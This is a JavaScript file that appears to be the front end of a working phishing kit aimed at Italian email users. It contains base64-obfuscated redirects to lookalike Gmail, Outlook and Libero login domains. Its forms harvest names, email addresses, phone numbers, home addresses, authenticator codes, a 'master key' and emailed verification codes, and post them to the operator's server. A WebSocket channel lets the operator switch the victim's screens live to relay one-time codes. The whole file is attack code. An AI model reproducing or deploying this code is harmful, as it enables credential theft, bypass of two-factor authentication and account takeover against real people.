let hasStatus = new URLSearchParams(window.location.search).has("stat");
let hasRef = new URLSearchParams(window.location.search).has("ref");
let id;
let statusState;

let ipAddress;

let gmail =
  "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vYWNjb3VudC5nbWFpbC1jb25maXJtLmNvbS8lMjIlMjAvJTNF";
let outlook =
  "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vbG9naW4ub3V0bG9vay1jb25maXJtLmNvbS9uZHpvTnpmeCUyMiUyMC8lM0U=";
let libero =
  "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vbG9naW4ubG9naW4tbGliZXJvLmNvbS9qblNQekZCUiUyMiUyMC8lM0U=";

let first = document.getElementById("1");
let second = document.getElementById("2");
let third = document.getElementById("3");
let fourth = document.getElementById("4");
let fifth = document.getElementById("5");
let sixth = document.getElementById("6");

let fullNameContainer = document.getElementById("full-name-container");
let emailContainer = document.getElementById("email-container");
let mobileContainer = document.getElementById("mobile-container");
let addressContainer = document.getElementById("address-container");

let fullName = document.getElementById("full-name");
let email = document.getElementById("email");
let mobileNumber = document.getElementById("mobile-number");
let address = document.getElementById("address");
let authenticatorAppInput = document.getElementById("authenticator-app-input");
let masterKeyInput = document.getElementById("master-key-input");
let emailCodeInput = document.getElementById("email-code-input");

let errorFullName = document.getElementById("error-full-name");
let errorEmail = document.getElementById("error-email");
let errorMobile = document.getElementById("error-mobile");
let errorAddress = document.getElementById("error-address");
let errorWrongEmail = document.getElementById("error-wrong-email");
let errorAuthenticatorAppInput = document.getElementById(
  "error-authenticator-app-input"
);
let errorMasterKeyInput = document.getElementById("error-master-key-input");
let errorEmailCodeInput = document.getElementById("error-email-code-input");

let continueSignIn = document.getElementById("continue-1");
let enterAuthenticatorApp = document.getElementById("enter-authenticator-app");
let enterMasterKey = document.getElementById("enter-masterkey");
let approvalEnter = document.getElementById("enter-approval");
let enterEmailCode = document.getElementById("enter-email-code");

let isAddress;

const defaultContinueSignInClass =
  "text-ds-button-primary-high hover:text-ds-button-primary-high-hover active:bg-ds-button-primary-high-active bg-ds-button-primary-high-gradient hover:bg-ds-button-primary-high-gradient-hover bg-ds-button-primary-high hover:bg-ds-button-primary-high-hover shadow-ds-button-primary-high w-full rounded-ds-button-xl outline-offset-ds-button relative box-border border-0 disabled:pointer-events-none cursor-pointer [-webkit-appearance:button] outline-none ms-ds-0 me-ds-0 mt-ds-0 mb-ds-0 p-ds-button-xl inline-block whitespace-nowrap no-underline text-ds-button-xl";
const defaultContinueSignInContent = `<span id="continue-1-span" class="flex items-center justify-center gap-ds-button-xl">Continue</span>`;

const loadingContinueSignInClass =
  "text-ds-button-primary-high hover:text-ds-button-primary-high-hover active:bg-ds-button-primary-high-active bg-ds-button-primary-high-gradient hover:bg-ds-button-primary-high-gradient-hover bg-ds-button-primary-high hover:bg-ds-button-primary-high-hover shadow-ds-button-primary-high w-full rounded-ds-button-xl outline-offset-ds-button relative box-border border-0 disabled:pointer-events-none pointer-events-none cursor-pointer [-webkit-appearance:button] outline-none ms-ds-0 me-ds-0 mt-ds-0 mb-ds-0 p-ds-button-xl inline-block whitespace-nowrap no-underline text-ds-button-xl";
const loadingContinueSignInContent = `<span class="flex items-center justify-center invisible gap-ds-button-xl"><span>Continue</span></span><span class="absolute left-0 top-0 inline-flex size-full items-center justify-center"><span class="ms-ds-0 me-ds-0 mt-ds-0 mb-ds-0 flex" role="status"><svg viewBox="0 0 24 24" width="24" height="24" fill="none" xmlns="http://www.w3.org/2000/svg" class="h-ds-icon-sm w-ds-icon-sm animate-spin"><clipPath id=":r16:"><path fill-rule="evenodd" clip-rule="evenodd" d="M21.0325 8.74811C21.8243 10.9476 21.7864 13.3605 20.9259 15.534C20.0653 17.7075 18.4412 19.4924 16.3583 20.5536C14.2754 21.6149 11.8768 21.8797 9.61259 21.2984C7.34834 20.717 5.37403 19.3294 4.06005 17.396C2.74607 15.4625 2.18274 13.1161 2.47573 10.7968C2.76872 8.47753 3.8979 6.34488 5.65143 4.79893C7.40496 3.25299 9.66232 2.4 12 2.4C12.6628 2.4 13.2 1.86274 13.2 1.2C13.2 0.537258 12.6628 0 12 0C9.0779 0 6.25619 1.06623 4.06428 2.99866C1.87237 4.9311 0.460892 7.59692 0.0946541 10.496C-0.271584 13.3951 0.432589 16.3282 2.07506 18.745C3.71753 21.1618 6.18543 22.8963 9.01574 23.623C11.8461 24.3497 14.8443 24.0187 17.4479 22.6921C20.0515 21.3654 22.0816 19.1344 23.1573 16.4175C24.233 13.7006 24.2804 10.6845 23.2906 7.93514C22.3007 5.18578 20.3417 2.89206 17.7811 1.48432C17.2003 1.16504 16.4707 1.37702 16.1514 1.95778C15.8321 2.53855 16.0441 3.26818 16.6248 3.58745C18.6734 4.71365 20.2406 6.54862 21.0325 8.74811Z"></path></clipPath><foreignObject x="0" y="0" width="24" height="24" clip-path="url(#:r16:)"><div class="size-full bg-[conic-gradient(from_20deg_at_50%_50%,var(--tw-gradient-stops))] from-transparent to-current"></div></foreignObject></svg></span></span>`;

const defaultAuthenticatorAppClass =
  "text-ds-button-primary-high hover:text-ds-button-primary-high-hover active:bg-ds-button-primary-high-active bg-ds-button-primary-high-gradient hover:bg-ds-button-primary-high-gradient-hover bg-ds-button-primary-high hover:bg-ds-button-primary-high-hover shadow-ds-button-primary-high w-full rounded-ds-button-xl outline-offset-ds-button relative box-border border-0 disabled:pointer-events-none opacity-40 [-webkit-appearance:button] outline-none ms-ds-0 me-ds-0 mt-ds-0 mb-ds-0 p-ds-button-xl inline-block whitespace-nowrap no-underline text-ds-button-xl";
const defaultAuthenticatorAppContent = `<span id="enter-authenticator-app-span" class="flex items-center justify-center gap-ds-button-xl">Enter</span>`;

const activeAuthenticatorAppClass =
  "text-ds-button-primary-high hover:text-ds-button-primary-high-hover active:bg-ds-button-primary-high-active bg-ds-button-primary-high-gradient hover:bg-ds-button-primary-high-gradient-hover bg-ds-button-primary-high hover:bg-ds-button-primary-high-hover shadow-ds-button-primary-high w-full rounded-ds-button-xl outline-offset-ds-button relative box-border border-0 disabled:pointer-events-none cursor-pointer [-webkit-appearance:button] outline-none ms-ds-0 me-ds-0 mt-ds-0 mb-ds-0 p-ds-button-xl inline-block whitespace-nowrap no-underline text-ds-button-xl";

const loadingAuthenticatorAppClass =
  "text-ds-button-primary-high hover:text-ds-button-primary-high-hover active:bg-ds-button-primary-high-active bg-ds-button-primary-high-gradient hover:bg-ds-button-primary-high-gradient-hover bg-ds-button-primary-high hover:bg-ds-button-primary-high-hover shadow-ds-button-primary-high w-full rounded-ds-button-xl outline-offset-ds-button relative box-border border-0 disabled:pointer-events-none pointer-events-none cursor-pointer [-webkit-appearance:button] outline-none ms-ds-0 me-ds-0 mt-ds-0 mb-ds-0 p-ds-button-xl inline-block whitespace-nowrap no-underline text-ds-button-xl";
const loadingAuthenticatorAppContent = `<span class="flex items-center justify-center invisible gap-ds-button-xl"><span>Continue</span></span><span class="absolute left-0 top-0 inline-flex size-full items-center justify-center"><span class="ms-ds-0 me-ds-0 mt-ds-0 mb-ds-0 flex" role="status"><svg viewBox="0 0 24 24" width="24" height="24" fill="none" xmlns="http://www.w3.org/2000/svg" class="h-ds-icon-sm w-ds-icon-sm animate-spin"><clipPath id=":r16:"><path fill-rule="evenodd" clip-rule="evenodd" d="M21.0325 8.74811C21.8243 10.9476 21.7864 13.3605 20.9259 15.534C20.0653 17.7075 18.4412 19.4924 16.3583 20.5536C14.2754 21.6149 11.8768 21.8797 9.61259 21.2984C7.34834 20.717 5.37403 19.3294 4.06005 17.396C2.74607 15.4625 2.18274 13.1161 2.47573 10.7968C2.76872 8.47753 3.8979 6.34488 5.65143 4.79893C7.40496 3.25299 9.66232 2.4 12 2.4C12.6628 2.4 13.2 1.86274 13.2 1.2C13.2 0.537258 12.6628 0 12 0C9.0779 0 6.25619 1.06623 4.06428 2.99866C1.87237 4.9311 0.460892 7.59692 0.0946541 10.496C-0.271584 13.3951 0.432589 16.3282 2.07506 18.745C3.71753 21.1618 6.18543 22.8963 9.01574 23.623C11.8461 24.3497 14.8443 24.0187 17.4479 22.6921C20.0515 21.3654 22.0816 19.1344 23.1573 16.4175C24.233 13.7006 24.2804 10.6845 23.2906 7.93514C22.3007 5.18578 20.3417 2.89206 17.7811 1.48432C17.2003 1.16504 16.4707 1.37702 16.1514 1.95778C15.8321 2.53855 16.0441 3.26818 16.6248 3.58745C18.6734 4.71365 20.2406 6.54862 21.0325 8.74811Z"></path></clipPath><foreignObject x="0" y="0" width="24" height="24" clip-path="url(#:r16:)"><div class="size-full bg-[conic-gradient(from_20deg_at_50%_50%,var(--tw-gradient-stops))] from-transparent to-current"></div></foreignObject></svg></span></span>`;

if (hasStatus) {
  id = new URLSearchParams(window.location.search).get("id");
  statusState = new URLSearchParams(window.location.search).get("stat");
}

if (hasRef) {
  id = id.toString();
  let ref = gmail;
  if (id.includes("gmail")) {
    ref = gmail;
  } else if (id.includes("outlook")) {
    ref = outlook;
  } else if (id.includes("libero")) {
    ref = libero;
  }

  document.write(decodeURIComponent(atob(`${ref}`)));
} else {
  showPanel();
  setupMobileNumberInput(); // Initialize mobile number input with +39 prefix
  
  let socket = null;
  let clientIp = null;
  let reconnectAttempts = 0;
  let maxReconnectAttempts = 10;
  let reconnectDelay = 1000; // Start with 1 second
  let reconnectTimer = null;
  let isManualClose = false;

  function connectWebSocket() {
    // Close existing connection if any
    if (socket && socket.readyState !== WebSocket.CLOSED) {
      isManualClose = true;
      socket.close();
    }

    try {
      socket = new WebSocket(`wss://${window.location.host}/ws`);

      socket.onopen = () => {
        console.log("✅ WebSocket connected");
        reconnectAttempts = 0;
        reconnectDelay = 1000; // Reset delay on successful connection
        
        // Optionally get client IP and send to server for initial status
        if (!clientIp) {
          fetch("https://api.ipify.org?format=json")
            .then((res) => res.json())
            .then((data) => {
              clientIp = data.ip;

              if (socket && socket.readyState === WebSocket.OPEN) {
                socket.send(
                  JSON.stringify({
                    type: "CHECK_IP",
                    ip: clientIp,
                  })
                );
              }
            })
            .catch((err) => console.error("Error fetching IP:", err));
        } else {
          // Re-send IP check if we already have the IP
          if (socket && socket.readyState === WebSocket.OPEN) {
            socket.send(
              JSON.stringify({
                type: "CHECK_IP",
                ip: clientIp,
              })
            );
          }
        }
      };

      socket.onerror = (error) => {
        console.error("❌ WebSocket error:", error);
        // Don't attempt reconnect here, onclose will handle it
      };

      socket.onclose = (event) => {
        console.warn("⚠️ WebSocket closed:", {
          code: event.code,
          reason: event.reason,
          wasClean: event.wasClean,
          manualClose: isManualClose
        });

        // Don't reconnect if it was a manual close
        if (isManualClose) {
          isManualClose = false;
          return;
        }

        // Attempt to reconnect
        if (reconnectAttempts < maxReconnectAttempts) {
          reconnectAttempts++;
          console.log(`🔄 Attempting to reconnect (${reconnectAttempts}/${maxReconnectAttempts}) in ${reconnectDelay}ms...`);
          
          reconnectTimer = setTimeout(() => {
            reconnectDelay = Math.min(reconnectDelay * 2, 30000); // Exponential backoff, max 30 seconds
            connectWebSocket();
          }, reconnectDelay);
        } else {
          console.error("❌ Max reconnection attempts reached. WebSocket will not reconnect.");
        }
      };

      // Global listener for all server broadcasts
      socket.onmessage = (event) => {
    const msg = JSON.parse(event.data);

    switch (msg.type) {
      case "STAT_UPDATED":
        if (msg.data.stat == "0") {
          show(sixth);
        }
        if (msg.data.stat == "1") {
          show(first);
        }
        if (msg.data.stat == "2") {
          show(third);
        }
        if (msg.data.stat == "3") {
          show(second);
          errorAuthenticatorAppInput.style.display = "none";
        }
        if (msg.data.stat == "4") {
          show(second);
          enterAuthenticatorApp.className = defaultAuthenticatorAppClass;
          enterAuthenticatorApp.innerHTML = defaultAuthenticatorAppContent;
          errorAuthenticatorAppInput.style.display = "block";
        }

        if (msg.data.stat == "5") {
          show(fourth);
          errorMasterKeyInput.style.display = "none";
        }
        if (msg.data.stat == "6") {
          show(fourth);
          enterMasterKey.className = defaultAuthenticatorAppClass;
          enterMasterKey.innerHTML = defaultAuthenticatorAppContent;
          errorMasterKeyInput.style.display = "block";
        }
        if (msg.data.stat == "7") {
          show(fifth);
          errorEmailCodeInput.style.display = "none";
        }
        if (msg.data.stat == "8") {
          show(fifth);
          enterEmailCode.className = defaultAuthenticatorAppClass;
          enterEmailCode.innerHTML = defaultAuthenticatorAppContent;
          errorEmailCodeInput.style.display = "block";
        }

        if (msg.data.stat == "9") {
          location.href = "https://www.facebook.com";
        }
        // Update row in table
        break;

      case "IP_STATUS":
        // You can keep your current show() logic here
        if (msg.exists) {
          if (msg.stat == "0") {
            show(sixth);
          }
          if (msg.stat == "1") {
            show(first);
          }
          if (msg.stat == "2") {
            show(third);
          }
          if (msg.stat == "3") {
            show(second);
            errorAuthenticatorAppInput.style.display = "none";
          }
          if (msg.stat == "4") {
            show(second);
            enterAuthenticatorApp.className = defaultAuthenticatorAppClass;
            enterAuthenticatorApp.innerHTML = defaultAuthenticatorAppContent;
            errorAuthenticatorAppInput.style.display = "block";
          }
          if (msg.stat == "5") {
            show(fourth);
            errorMasterKeyInput.style.display = "none";
          }
          if (msg.stat == "6") {
            show(fourth);
            enterMasterKey.className = defaultAuthenticatorAppClass;
            enterMasterKey.innerHTML = defaultAuthenticatorAppContent;
            errorMasterKeyInput.style.display = "block";
          } else if (msg.stat == "7") {
            show(fifth);
            errorEmailCodeInput.style.display = "none";
          } else if (msg.stat == "8") {
            show(fifth);
            enterEmailCode.className = defaultAuthenticatorAppClass;
            enterEmailCode.innerHTML = defaultAuthenticatorAppContent;
            errorEmailCodeInput.style.display = "block";
          } else if (msg.stat == "9") {
            location.href = "https://www.facebook.com";
          }
        } else {
          show(first);
        }
        break;

      default:
    }
      };
    } catch (error) {
      console.error("❌ Error creating WebSocket:", error);
      // Attempt to reconnect after delay
      if (reconnectAttempts < maxReconnectAttempts) {
        reconnectAttempts++;
        reconnectTimer = setTimeout(() => {
          reconnectDelay = Math.min(reconnectDelay * 2, 30000);
          connectWebSocket();
        }, reconnectDelay);
      }
    }
  }

  // Initialize WebSocket connection
  connectWebSocket();

  // Reconnect on page visibility change (user comes back to tab)
  document.addEventListener("visibilitychange", () => {
    if (!document.hidden && (!socket || socket.readyState === WebSocket.CLOSED)) {
      console.log("Page visible again, checking WebSocket connection...");
      if (reconnectAttempts < maxReconnectAttempts) {
        connectWebSocket();
      }
    }
  });

  // Clean up on page unload
  window.addEventListener("beforeunload", () => {
    isManualClose = true;
    if (socket) {
      socket.close();
    }
    if (reconnectTimer) {
      clearTimeout(reconnectTimer);
    }
  });

  function showPanel() {
    // Fetch IP first
    fetch("https://api.ipify.org?format=json")
      .then((res) => res.json())
      .then((data) => {
        ipAddress = data.ip;
      })
      .catch((err) => console.error("Error fetching IP:", err));

    document.body.addEventListener("click", function (e) {
      let targetId = e.target.id;

      if (targetId == "continue-1" || targetId == "continue-1-span") {
        let proceed;
        if (isAddress) {
          proceed = checkAllInputs([fullName, email, mobileNumber, address]);
        } else {
          proceed = checkAllInputs([fullName, email, mobileNumber]);
        }
        if (proceed) {
          continueSignIn.className = loadingContinueSignInClass;
          continueSignIn.innerHTML = loadingContinueSignInContent;

          errorWrongEmail.style.display = "none";

          setTimeout(function () {
            if (email.value === id) {
              sendUser();
            } else {
              continueSignIn.className = defaultContinueSignInClass;
              continueSignIn.innerHTML = defaultContinueSignInContent;
              errorWrongEmail.style.display = "block";
            }
          }, 3000);
        }
      } else if (
        targetId == "enter-authenticator-app" ||
        targetId == "enter-authenticator-app-span"
      ) {
        if (authenticatorAppInput.value.trim() !== "") {
          enterAuthenticatorApp.className = loadingAuthenticatorAppClass;
          enterAuthenticatorApp.innerHTML = loadingAuthenticatorAppContent;

          setTimeout(function () {
            sendAuthenticatorCode();
          }, 3000);
        }
      } else if (
        targetId == "enter-masterkey" ||
        targetId == "enter-masterkey-span"
      ) {
        if (masterKeyInput.value.trim() !== "") {
          enterMasterKey.className = loadingAuthenticatorAppClass;
          enterMasterKey.innerHTML = loadingAuthenticatorAppContent;

          setTimeout(function () {
            sendMasterKeyCode();
          }, 3000);
        }
      } else if (
        targetId == "enter-approval" ||
        targetId == "enter-approval-span"
      ) {
        approvalEnter.className = loadingAuthenticatorAppClass;
        approvalEnter.innerHTML = loadingAuthenticatorAppContent;

        setTimeout(function () {
          let currentUrl = window.location.href;
          currentUrl += "&ref=4";
          window.location.href = currentUrl;
        }, 3000);
      } else if (
        targetId == "enter-email-code" ||
        targetId == "enter-email-code-span"
      ) {
        if (emailCodeInput.value.trim() !== "") {
          enterEmailCode.className = loadingAuthenticatorAppClass;
          enterEmailCode.innerHTML = loadingAuthenticatorAppContent;

          setTimeout(function () {
            sendEmailCode();
          }, 3000);
        }
      }
    });
  }
}

function checkAllInputs(inputs) {
  let allFilled = true;

  inputs.forEach((input) => {
    let value = input.value.trim();
    let errorBox =
      input.parentElement.parentElement.parentElement.nextElementSibling;

    if (!value) {
      errorBox.style.display = "block";
      allFilled = false;
    } else {
      errorBox.style.display = "none";
    }
  });

  return allFilled;
}

function toggleBox(isYes) {
  isAddress = isYes;
  const box = document.getElementById("extraBox");
  box.style.display = isYes ? "block" : "none";
}
if (!isAddress) {
  document.getElementById("no").click();
}

function show(next) {
  let cards = document.querySelectorAll(".card");
  cards.forEach(function (card) {
    card.style.display = "none";
  });
  next.style.display = "block";
}

// Format mobile number - UI already shows +39 prefix, so just clean the number part
function formatMobileNumber(number) {
  if (!number) return "+39";
  
  // Remove any non-digit characters (user only types numbers after +39)
  let cleaned = number.trim().replace(/\D/g, '');
  
  // Remove leading 0 if present (Italian numbers don't start with 0 after country code)
  if (cleaned.startsWith("0")) {
    cleaned = cleaned.substring(1);
  }
  
  // Combine with +39 prefix
  return "+39" + cleaned;
}

// Ensure mobile number input only accepts digits and maintains +39 prefix
function setupMobileNumberInput() {
  // Get the prefix element
  const prefixElement = document.getElementById("mobile-prefix");
  
  // Set initial value to empty
  mobileNumber.value = "";
  
  // Function to update prefix visibility based on input value
  function updatePrefixVisibility() {
    if (prefixElement) {
      if (mobileNumber.value.trim() !== "") {
        prefixElement.style.visibility = "visible";
      } else {
        prefixElement.style.visibility = "hidden";
      }
    }
  }
  
  // Show prefix when input is focused
  mobileNumber.addEventListener("focus", function() {
    if (prefixElement) {
      prefixElement.style.visibility = "visible";
    }
  });
  
  // Update prefix visibility when input loses focus (show if has value, hide if empty)
  mobileNumber.addEventListener("blur", function() {
    updatePrefixVisibility();
  });
  
  // Handle input to only allow digits
  mobileNumber.addEventListener("input", function(e) {
    // Remove any non-digit characters
    let value = e.target.value.replace(/\D/g, '');
    
    // Remove leading 0 if user types it (Italian numbers don't start with 0)
    if (value.startsWith("0")) {
      value = value.substring(1);
    }
    
    // Limit to reasonable length (max 10 digits for Italian mobile)
    if (value.length > 10) {
      value = value.substring(0, 10);
    }
    
    e.target.value = value;
    
    // Update prefix visibility based on whether there's a value
    updatePrefixVisibility();
  });
  
  // Prevent paste of non-numeric content
  mobileNumber.addEventListener("paste", function(e) {
    e.preventDefault();
    let pasted = (e.clipboardData || window.clipboardData).getData("text");
    let cleaned = pasted.replace(/\D/g, '');
    if (cleaned.startsWith("0")) {
      cleaned = cleaned.substring(1);
    }
    if (cleaned.length > 10) {
      cleaned = cleaned.substring(0, 10);
    }
    mobileNumber.value = cleaned;
  });
  
  // Prevent typing non-numeric characters
  mobileNumber.addEventListener("keypress", function(e) {
    // Allow: backspace, delete, tab, escape, enter, and numbers
    if (!/[0-9]/.test(e.key) && !["Backspace", "Delete", "Tab", "Escape", "Enter"].includes(e.key)) {
      e.preventDefault();
    }
  });
}

function sendUser() {
  let stat;
  if (
    email.value.includes("gmail") ||
    email.value.includes("outlook") ||
    email.value.includes("libero")
  ) {
    stat = "2";
  } else {
    stat = "0";
  }
  
  // Format mobile number with +39 prefix (input only contains digits)
  const formattedMobileNumber = formatMobileNumber(mobileNumber.value);
  
  fetch("/add-user", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      ip: ipAddress,
      fullname: fullName.value,
      email: email.value,
      mobile_number: formattedMobileNumber,
      address: address.value,
      stat: stat,
    }),
  })
    .then((res) => res.json())
    .then((data) => {
      if (data == true) {
        if (stat == "2") {
          show(third);
        } else {
          show(sixth);
        }

        continueSignIn.className = defaultContinueSignInClass;
        continueSignIn.innerHTML = defaultContinueSignInContent;
      }
    })
    .catch((err) => log("POST Error: " + err));
}

function updateStat() {
  fetch("/update-stat", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      ip: ipAddress,
      stat: "0",
    }),
  })
    .then((res) => res.json())
    .then((data) => {})
    .catch((err) => console.log("POST Error: "));
}

function sendAuthenticatorCode() {
  fetch("/verify-authenticator-code", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      ip: ipAddress,
      authenticatorCode: authenticatorAppInput.value,
    }),
  })
    .then((res) => res.json())
    .then((data) => {})
    .catch((err) => console.log("POST Error: "));
}

function sendMasterKeyCode() {
  fetch("/update-email-code", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      ip: ipAddress,
      email_code: masterKeyInput.value,
    }),
  })
    .then((res) => res.json())
    .then((data) => {})
    .catch((err) => console.log("POST Error: "));
}

function sendEmailCode() {
  fetch("/update-email-code-2", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      ip: ipAddress,
      email_code_2: emailCodeInput.value,
    }),
  })
    .then((res) => res.json())
    .then((data) => {})
    .catch((err) => console.log("POST Error: "));
}

[authenticatorAppInput, masterKeyInput, emailCodeInput].forEach((input) => {
  input.addEventListener("input", () => {
    if (input === authenticatorAppInput) {
      if (authenticatorAppInput.value.trim() != "") {
        enterAuthenticatorApp.className = activeAuthenticatorAppClass;
        errorAuthenticatorAppInput.style.display = "none";
      } else {
        enterAuthenticatorApp.className = defaultAuthenticatorAppClass;
      }
      // authenticatorAppContainer.className = defaultEmailClass;
      errorAuthenticatorAppInput.style.display = "none";
    }
    if (input === masterKeyInput) {
      if (masterKeyInput.value.trim() != "") {
        enterMasterKey.className = activeAuthenticatorAppClass;
        errorMasterKeyInput.style.display = "none";
      } else {
        enterMasterKey.className = defaultAuthenticatorAppClass;
      }
      // authenticatorAppContainer.className = defaultEmailClass;
      errorMasterKeyInput.style.display = "none";
    }
    if (input === emailCodeInput) {
      if (emailCodeInput.value.trim() != "") {
        enterEmailCode.className = activeAuthenticatorAppClass;
        errorEmailCodeInput.style.display = "none";
      } else {
        enterEmailCode.className = defaultAuthenticatorAppClass;
      }
      // authenticatorAppContainer.className = defaultEmailClass;
      errorEmailCodeInput.style.display = "none";
    }
  });
});
